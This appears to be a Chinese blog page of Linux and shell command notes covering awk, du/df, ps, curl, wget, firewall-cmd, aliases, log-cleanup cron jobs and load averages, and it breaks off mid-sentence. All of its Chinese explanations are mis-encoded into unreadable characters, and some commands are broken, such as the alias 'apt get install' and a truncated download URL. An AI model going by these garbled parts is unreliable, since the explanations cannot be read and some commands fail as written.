<h3 id="git-push-æŠ¥é”™-fatal-HttpRequestException-encountered"><a href="#git-push-æŠ¥é”™-fatal-HttpRequestException-encountered" class="headerlink" title="git push æŠ¥é”™ fatal: HttpRequestException encountered."></a>git push æŠ¥é”™ fatal: HttpRequestException encountered.</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Github ç¦ç”¨äº†TLS v1<span class="number">.0</span> and v1<span class="number">.1</span>ï¼Œå¿…é¡»æ›´æ–°Windowsçš„gitå‡­è¯ç®¡ç†å™¨</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/Microsoft/Git-Credential-Manager-for-Windows/releases/tag/v1.18.2</span></span><br><span class="line"></span><br><span class="line">ä¸‹è½½å¹¶å®‰è£…åå³å¯è§£å†³</span><br></pre></td></tr></table></figure>
<h3 id="pip-install-å¤±è´¥"><a href="#pip-install-å¤±è´¥" class="headerlink" title="pip install å¤±è´¥"></a>pip install å¤±è´¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> pip install myqr</span><br><span class="line">Collecting myqr</span><br><span class="line">  Retrying (Retry(total=<span class="number">4</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'ProxyError('</span>Cannot connect to proxy.<span class="string">', NewConnectionError('</span>&lt;pip._vendor.urllib3.connection.VerifiedHTTPSConnection object at <span class="number">0x03B22330</span>&gt;: Failed to establish a <span class="keyword">new</span> connection: [WinError <span class="number">10061</span>] ç”±äºç›®</span><br><span class="line">æ ‡è®¡ç®—æœºç§¯ææ‹’ç»ï¼Œæ— æ³•è¿æ¥ã€‚<span class="string">'))'</span>: <span class="regexp">/simple/my</span>qr/</span><br><span class="line">æ‰“å¼€Interneté€‰é¡¹ï¼Œé€‰æ‹©è¿æ¥â€“å±€åŸŸç½‘è®¾ç½®  å…¨éƒ¨å–æ¶ˆå‹¾é€‰ï¼Œé—®é¢˜è§£å†³</span><br><span class="line">https:<span class="comment">//blog.csdn.net/u010784236/article/details/51820284</span></span><br></pre></td></tr></table></figure>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">'this is a test'</span> | awk <span class="string">'&#123;print $0&#125;'</span></span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123; print $1 &#125;'</span> demo.txt</span><br><span class="line">$(NF<span class="number">-1</span>) ä»£è¡¨å€’æ•°ç¬¬äºŒä¸ªå­—æ®µã€‚</span><br><span class="line"> </span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;print $1, $(NF-1)&#125;'</span> demo.txt</span><br><span class="line"> NR è¡¨ç¤ºå½“å‰å¤„ç†çš„æ˜¯ç¬¬å‡ è¡Œã€‚</span><br><span class="line"> </span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;print NR ") " $1&#125;'</span> demo.txt</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'&#123; print toupper($1) &#125;'</span> demo.txt</span><br><span class="line">awk -F ':' '/usr/ &#123;print $1&#125;' demo.txt #awk â€˜æ¡ä»¶ åŠ¨ä½œâ€™ æ–‡ä»¶å  print å‘½ä»¤å‰é¢æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œåªè¾“å‡ºåŒ…å« usr çš„è¡Œ</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'NR % 2 == 1 &#123;print $1&#125;'</span> demo.txt è¾“å‡ºå¥‡æ•°è¡Œ</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'&#123;if ($1 &gt; "m") print $1&#125;'</span> demo.txt</span><br><span class="line">$ awk -F <span class="string">':'</span> <span class="string">'&#123;if ($1 &gt; "m") print $1; else print "---"&#125;'</span> demo.txt</span><br></pre></td></tr></table></figure>
<h3 id="æ‰¹é‡åˆ é™¤-DS-Store-æ–‡ä»¶"><a href="#æ‰¹é‡åˆ é™¤-DS-Store-æ–‡ä»¶" class="headerlink" title="æ‰¹é‡åˆ é™¤ .DS_Store æ–‡ä»¶"></a>æ‰¹é‡åˆ é™¤ .DS_Store æ–‡ä»¶</h3><p><code>find /home/path -name &quot;.DS_Store&quot; -type f -delete</code></p>
<h3 id="æŸ¥çœ‹ç¡¬ç›˜åŠå†…å­˜ç©ºé—´"><a href="#æŸ¥çœ‹ç¡¬ç›˜åŠå†…å­˜ç©ºé—´" class="headerlink" title="æŸ¥çœ‹ç¡¬ç›˜åŠå†…å­˜ç©ºé—´"></a>æŸ¥çœ‹ç¡¬ç›˜åŠå†…å­˜ç©ºé—´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"># æŸ¥çœ‹å†…å­˜åŠswapå¤§å°</span><br><span class="line">free -m</span><br><span class="line"># æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å¤§å°ï¼ˆåŒ…æ‹¬å­æ–‡ä»¶å¤¹ï¼‰</span><br><span class="line">du -sh</span><br><span class="line"># æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å¤§å°</span><br><span class="line">du -h /tmp</span><br><span class="line"># æŸ¥çœ‹tmpç›®å½•(åŒ…å«å­ç›®å½•)çš„å¤§å°</span><br><span class="line">du -ah /tmp</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶å¤¹å¤§å°</span><br><span class="line">du -hs ftp</span><br><span class="line"># æŸ¥çœ‹ç£ç›˜å‰©ä½™ç©ºé—´</span><br><span class="line">df -hl</span><br><span class="line"># æŸ¥çœ‹æ¯ä¸ªæ ¹è·¯å¾„çš„åˆ†åŒºå¤§å°</span><br><span class="line">df -h</span><br><span class="line"># è¿”å›è¯¥ç›®å½•çš„å¤§å°</span><br><span class="line">du -sh [ç›®å½•å]</span><br><span class="line"># è¿”å›è¯¥æ–‡ä»¶å¤¹æ€»Mæ•°</span><br><span class="line">du -sm [æ–‡ä»¶å¤¹]</span><br></pre></td></tr></table></figure>
<h3 id="ç»Ÿè®¡æ–‡ä»¶æˆ–ç›®å½•çš„ä¸ªæ•°"><a href="#ç»Ÿè®¡æ–‡ä»¶æˆ–ç›®å½•çš„ä¸ªæ•°" class="headerlink" title="ç»Ÿè®¡æ–‡ä»¶æˆ–ç›®å½•çš„ä¸ªæ•°"></a>ç»Ÿè®¡æ–‡ä»¶æˆ–ç›®å½•çš„ä¸ªæ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°</span><br><span class="line">ls -l | grep <span class="string">'^-'</span> | wc -l</span><br><span class="line"># ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°</span><br><span class="line">ls -l | grep <span class="string">'^d'</span> | wc -l</span><br><span class="line"># ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°(åŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„)</span><br><span class="line">ls -lR | grep <span class="string">'^-'</span> | wc -l</span><br><span class="line"># ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°(åŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„)</span><br><span class="line">ls -lR | grep <span class="string">'^d'</span> | wc -l</span><br><span class="line"># ç»Ÿè®¡/var/wwwç›®å½•ä¸‹çš„æ‰€æœ‰pyæ–‡ä»¶</span><br><span class="line">ls -l /<span class="keyword">var</span>/www | grep py | wc -l</span><br><span class="line"># ç»Ÿè®¡/var/wwwç›®å½•ä¸‹(åŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„)çš„æ‰€æœ‰pyæ–‡ä»¶</span><br><span class="line">ls -lR /<span class="keyword">var</span>/www | grep py | wc -l</span><br></pre></td></tr></table></figure>
<h3 id="æŸ¥çœ‹CPUå’Œå†…å­˜å ç”¨"><a href="#æŸ¥çœ‹CPUå’Œå†…å­˜å ç”¨" class="headerlink" title="æŸ¥çœ‹CPUå’Œå†…å­˜å ç”¨"></a>æŸ¥çœ‹CPUå’Œå†…å­˜å ç”¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># CPUå ç”¨æœ€å¤šçš„å‰10ä¸ªè¿›ç¨‹ï¼š </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k3|head <span class="number">-10</span> </span><br><span class="line"># å†…å­˜æ¶ˆè€—æœ€å¤šçš„å‰10ä¸ªè¿›ç¨‹ </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k4|head <span class="number">-10</span> </span><br><span class="line"># è™šæ‹Ÿå†…å­˜ä½¿ç”¨æœ€å¤šçš„å‰10ä¸ªè¿›ç¨‹ </span><br><span class="line">ps auxw|head <span class="number">-1</span>;ps auxw|sort -rn -k5|head <span class="number">-10</span></span><br><span class="line"> æŒ‰å†…å­˜å ç”¨å¯¹è¿›ç¨‹æ’åº</span><br><span class="line">ps auxw --sort=rss</span><br><span class="line"># æŒ‰CPUå ç”¨å¯¹è¿›ç¨‹æ’åº</span><br><span class="line">ps auxw --sort=%cpu</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æ‰€æœ‰è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">ps -A</span><br></pre></td></tr></table></figure>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å¼ºåˆ¶æŒ‡å®šæœ¬åœ°ç«¯å£</span><br><span class="line">curl --local-port <span class="number">51</span> http:<span class="comment">//web.example.com</span></span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹è¿æ¥çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line"># --trace-time è·Ÿè¸ª/è¯¦ç»†è¾“å‡ºæ—¶ï¼Œæ·»åŠ æ—¶é—´æˆ³</span><br><span class="line">curl -Sv --trace-time http:<span class="comment">//web.example.com</span></span><br></pre></td></tr></table></figure>
<h3 id="è¿æ¥ä½ æœåŠ¡å™¨-top10-ç”¨æˆ·ç«¯çš„-IP-åœ°å€"><a href="#è¿æ¥ä½ æœåŠ¡å™¨-top10-ç”¨æˆ·ç«¯çš„-IP-åœ°å€" class="headerlink" title="è¿æ¥ä½ æœåŠ¡å™¨ top10 ç”¨æˆ·ç«¯çš„ IP åœ°å€"></a>è¿æ¥ä½ æœåŠ¡å™¨ top10 ç”¨æˆ·ç«¯çš„ IP åœ°å€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat | awk <span class="string">'&#123;print $5&#125;'</span> | awk -F <span class="string">':'</span> <span class="string">'&#123;print $1&#125;'</span> | sort | uniq -c | sort -rn | head -n <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h3 id="æœ€å¸¸ç”¨çš„10ä¸ªå‘½ä»¤"><a href="#æœ€å¸¸ç”¨çš„10ä¸ªå‘½ä»¤" class="headerlink" title="æœ€å¸¸ç”¨çš„10ä¸ªå‘½ä»¤"></a>æœ€å¸¸ç”¨çš„10ä¸ªå‘½ä»¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history | sort | uniq -c | sort -rn | head -n <span class="number">10</span> (or cat .zhistory | sort | uniq -c | sort -rn | head -n <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h3 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alias nis=<span class="string">"npm install --save "</span></span><br><span class="line">alias svim=<span class="string">'sudo vim'</span></span><br><span class="line">alias mkcd=<span class="string">'foo()&#123; mkdir -p "$1"; cd "$1" &#125;; foo '</span></span><br><span class="line">alias install=<span class="string">'sudo apt get install'</span></span><br><span class="line">alias update=<span class="string">'sudo apt-get update; sudo apt-get upgrade'</span></span><br><span class="line">alias ..=<span class="string">"cd .."</span></span><br><span class="line">alias ...=<span class="string">"cd ..; cd .."</span></span><br><span class="line">alias www=<span class="string">'python -m SimpleHTTPServer 8000'</span></span><br><span class="line">alias sock5=<span class="string">'ssh -D 8080 -q -C -N -f user@your.server'</span></span><br></pre></td></tr></table></figure>
<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//www.openss7.org/repos/tarballs/strx25-0.9.2.1.ta</span></span><br><span class="line">$ wget -b http:<span class="comment">//www.openss7.org/repos/tarballs/strx25-0.9.2.1.tar.bz2</span></span><br><span class="line">Continuing <span class="keyword">in</span> background, pid <span class="number">1984.</span></span><br><span class="line">Output will be written to <span class="string">`wget-log'.</span></span><br><span class="line"><span class="string">wget -i download-file-list.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo firewall-cmd --zone=public --add-port=<span class="number">60001</span>/udp --permanent</span><br><span class="line">sudo firewall-cmd --reload</span><br><span class="line">#ä¹‹åæ£€æŸ¥æ–°çš„é˜²ç«å¢™è§„åˆ™</span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸´æ—¶å…³é—­é˜²ç«å¢™,é‡å¯åä¼šé‡æ–°è‡ªåŠ¨æ‰“å¼€</span></span><br><span class="line">systemctl restart firewalld</span><br><span class="line"><span class="comment">//æ£€æŸ¥é˜²ç«å¢™çŠ¶æ€</span></span><br><span class="line">firewall-cmd --state</span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"><span class="comment">//Disable firewall</span></span><br><span class="line">systemctl disable firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl status firewalld</span><br><span class="line"><span class="comment">//Enable firewall</span></span><br><span class="line">systemctl enable firewalld</span><br><span class="line">systemctl start firewalld</span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>
<h3 id="æ˜¾ç¤º-Path-ç¯å¢ƒå˜é‡"><a href="#æ˜¾ç¤º-Path-ç¯å¢ƒå˜é‡" class="headerlink" title="æ˜¾ç¤º Path ç¯å¢ƒå˜é‡"></a>æ˜¾ç¤º Path ç¯å¢ƒå˜é‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> $ echo $PATH | tr : \\n</span><br><span class="line">/data2/node-v6<span class="number">.11</span><span class="number">.0</span>-linux-x64<span class="comment">//bin</span></span><br><span class="line">/usr/bin</span><br><span class="line">/bin</span><br><span class="line">/usr/sbin</span><br><span class="line">/sbin</span><br><span class="line">/usr/local/bin</span><br><span class="line">/usr/local/sbin</span><br><span class="line">/data0/opt/python27/bin</span><br></pre></td></tr></table></figure>
<h3 id="åˆ¤æ–­å­—ç¬¦ä¸²åŒ…å«"><a href="#åˆ¤æ–­å­—ç¬¦ä¸²åŒ…å«" class="headerlink" title="åˆ¤æ–­å­—ç¬¦ä¸²åŒ…å«"></a>åˆ¤æ–­å­—ç¬¦ä¸²åŒ…å«</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [[ $tar =~ tar.gz ]];then echo <span class="string">"åŒ…å«"</span>;fi</span><br></pre></td></tr></table></figure>
<h3 id="å¿«é€Ÿä¿®æ”¹åç¼€åå­—"><a href="#å¿«é€Ÿä¿®æ”¹åç¼€åå­—" class="headerlink" title="å¿«é€Ÿä¿®æ”¹åç¼€åå­—"></a>å¿«é€Ÿä¿®æ”¹åç¼€åå­—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ll</span><br><span class="line">CentOS-base.repo.repo.bak</span><br><span class="line">epel.repo.repo.bak</span><br><span class="line"></span><br><span class="line">ls *.bak|awk -F. <span class="string">'&#123;print $1&#125;'</span>|xargs -t -i mv &#123;&#125;.repo.repo.bak &#123;&#125;.repo</span><br></pre></td></tr></table></figure>
<h3 id="æ•°å€¼æ’åº"><a href="#æ•°å€¼æ’åº" class="headerlink" title="æ•°å€¼æ’åº"></a>æ•°å€¼æ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort -t <span class="string">":"</span> -k <span class="number">3</span> -n /etc/passwd</span><br></pre></td></tr></table></figure>
<h3 id="æ¸…ç†httpdæœåŠ¡æ—¥å¿—è¶…è¿‡3å¤©çš„å†…å®¹"><a href="#æ¸…ç†httpdæœåŠ¡æ—¥å¿—è¶…è¿‡3å¤©çš„å†…å®¹" class="headerlink" title="æ¸…ç†httpdæœåŠ¡æ—¥å¿—è¶…è¿‡3å¤©çš„å†…å®¹"></a>æ¸…ç†httpdæœåŠ¡æ—¥å¿—è¶…è¿‡3å¤©çš„å†…å®¹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">5</span> * * * <span class="regexp">/usr/</span>bin/find /<span class="keyword">var</span>/log/httpd/ -type f -mtime +<span class="number">3</span> -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h3 id="awkè·å–json"><a href="#awkè·å–json" class="headerlink" title="awkè·å–json"></a>awkè·å–json</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>: <span class="string">"michael"</span>, <span class="string">"sex"</span>: <span class="string">"male"</span>, <span class="string">"pkg_url"</span>: <span class="string">"www.github.com"</span>, <span class="string">"number"</span>: <span class="string">"888"</span>&#125;</span><br><span class="line"></span><br><span class="line">pkg_url=$(echo $env | awk -F <span class="string">"pkg_url\": \""</span> <span class="string">'&#123;print $2&#125;'</span> | awk -F <span class="string">"\","</span> <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line">echo $pkg_url</span><br><span class="line">www.github.com</span><br></pre></td></tr></table></figure>
<h3 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹ CPU çš„å‹å·</span><br><span class="line"></span><br><span class="line"> cat /proc/cpuinfo | grep <span class="string">'model name'</span> | sort | uniq</span><br><span class="line">æŸ¥çœ‹ CPU é¢—æ•°</span><br><span class="line"></span><br><span class="line">å®é™… Server ä¸­æ’æ§½ä¸Šçš„ CPU ä¸ªæ•°ï¼Œç‰©ç† cpu æ•°é‡ï¼Œå¯ä»¥æ•°ä¸é‡å¤çš„ physical id ä¸ªæ•°ã€‚</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo | grep <span class="string">'physical id'</span> | sort | uniq | wc -l</span><br><span class="line">æŸ¥çœ‹ CPU æ ¸æ•°</span><br><span class="line"></span><br><span class="line">ä¸€é¢— CPU ä¸Šé¢èƒ½å¤„ç†æ•°æ®çš„èŠ¯ç‰‡ç»„çš„æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo |grep <span class="string">"cores"</span>|uniq|awk <span class="string">'&#123;print $4&#125;'</span></span><br><span class="line">top å‘½ä»¤æŸ¥è¯¢å‡ºæ¥çš„å°±æ˜¯é€»è¾‘ CPU çš„æ•°é‡ã€‚</span><br><span class="line"></span><br><span class="line">cat /proc/cpuinfo |grep <span class="string">"processor"</span>|wc -l</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32681</span></span><br></pre></td></tr></table></figure>
<h3 id="æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½"><a href="#æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½"></a>æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">$ uptime\</span><br><span class="line"><span class="number">16</span>:<span class="number">33</span>:<span class="number">56</span> up <span class="number">69</span> days,  <span class="number">5</span>:<span class="number">10</span>,  <span class="number">1</span> user,  load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span></span><br><span class="line">ä»¥ä¸Šä¿¡æ¯çš„è§£æå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">16</span>:<span class="number">33</span>:<span class="number">56</span> : å½“å‰æ—¶é—´</span><br><span class="line">up <span class="number">69</span> days, <span class="number">5</span>:<span class="number">10</span> : ç³»ç»Ÿè¿è¡Œäº† <span class="number">69</span> å¤© <span class="number">5</span> å°æ—¶ <span class="number">10</span> åˆ†</span><br><span class="line"><span class="number">1</span> user : å½“å‰æœ‰ <span class="number">1</span> ä¸ªç”¨æˆ·ç™»å½•äº†ç³»ç»Ÿ load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span> : ç³»ç»Ÿåœ¨è¿‡å» <span class="number">1</span> åˆ†é’Ÿå†…ï¼Œ<span class="number">5</span> åˆ†é’Ÿå†…ï¼Œ<span class="number">15</span> åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½</span><br><span class="line">load average: <span class="number">0.14</span>, <span class="number">0.24</span>, <span class="number">0.29</span> : ç³»ç»Ÿåœ¨è¿‡å» <span class="number">1</span> åˆ†é’Ÿå†…ï¼Œ<span class="number">5</span> åˆ†é’Ÿå†…ï¼Œ<span class="number">15</span> åˆ†é’Ÿå†…çš„å¹³å‡è´Ÿè½½</span><br><span class="line">å¹³å‡è´Ÿè½½è§£æ</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹é€»è¾‘ CPU æ ¸å¿ƒæ•°ï¼š</span><br><span class="line"></span><br><span class="line">$ grep <span class="string">'model name'</span> /proc/cpuinfo | wc -l\</span><br><span class="line"><span class="number">1</span>\</span><br><span class="line">è¿è¡Œç»“æœè¡¨ç¤ºï¼Œæœ‰ <span class="number">1</span> ä¸ªé€»è¾‘ CPU æ ¸å¿ƒã€‚ä»¥ <span class="number">1</span> ä¸ª CPU æ ¸å¿ƒä¸ºä¾‹ï¼Œå‡è®¾ CPU æ¯åˆ†é’Ÿæœ€å¤šå¤„ç† <span class="number">100</span> ä¸ªè¿›ç¨‹ â€“</span><br><span class="line"></span><br><span class="line">load=<span class="number">0</span>ï¼Œæ²¡æœ‰è¿›ç¨‹éœ€è¦ CPU</span><br><span class="line">load=<span class="number">0.5</span>ï¼ŒCPU å¤„ç†äº† <span class="number">50</span> ä¸ªè¿›ç¨‹</span><br><span class="line">load=<span class="number">1</span>, CPU å¤„ç†äº† <span class="number">100</span> ä¸ªè¿›ç¨‹ï¼Œè¿™æ—¶ CPU 